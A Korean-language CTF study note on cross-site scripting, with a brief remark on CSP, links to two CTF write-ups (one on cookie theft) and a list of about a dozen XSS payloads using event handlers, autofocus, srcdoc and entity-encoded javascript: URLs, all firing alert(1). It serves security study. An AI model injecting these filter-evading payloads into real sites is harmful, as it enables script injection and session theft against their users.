# 크로스 사이트 스크립팅

# 1. 설명
자주 나오는 유형이며, CSP(Contents Security Policy)와 섞여서 복잡하게 나오기도 합니다.

# 2. writeup
- [BYU CTF 2022 - Social Media](https://skyepodium.tistory.com/entry/BYU-CTF-2022-Social-Media-%ED%81%AC%EB%A1%9C%EC%8A%A4%EC%82%AC%EC%9D%B4%ED%8A%B8-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85?category=1028047)    
정석적인 쿠키 탈취 문제

- [[BSidesSF CTF] web-tutorial-1](https://skyepodium.tistory.com/entry/BSidesSF-CTF-web-tutorial-1?category=1028047)    
약간의 응용이 필요

# 3. 스크립트 목록

```js
// 1. 즉시 실행

`<svg/onload=alert(1)>`

`<video><source onerror="alert(1)">`

`<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />`

`<picture><source srcset="x"><img onerror="alert(1)"></picture>`

`<picture><img srcset="x" onerror="alert(1)"></picture>`

`<img srcset=",,,,,x" onerror="alert(1)">`


// 2. 액션

`<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>`

`<input onfocus=alert(1) autofocus>`

`<input onblur=alert(1) autofocus><input autofocus>`

`<form><button formaction="javascript:alert(1)">X</button>`

`<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>`

`<a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a>`
```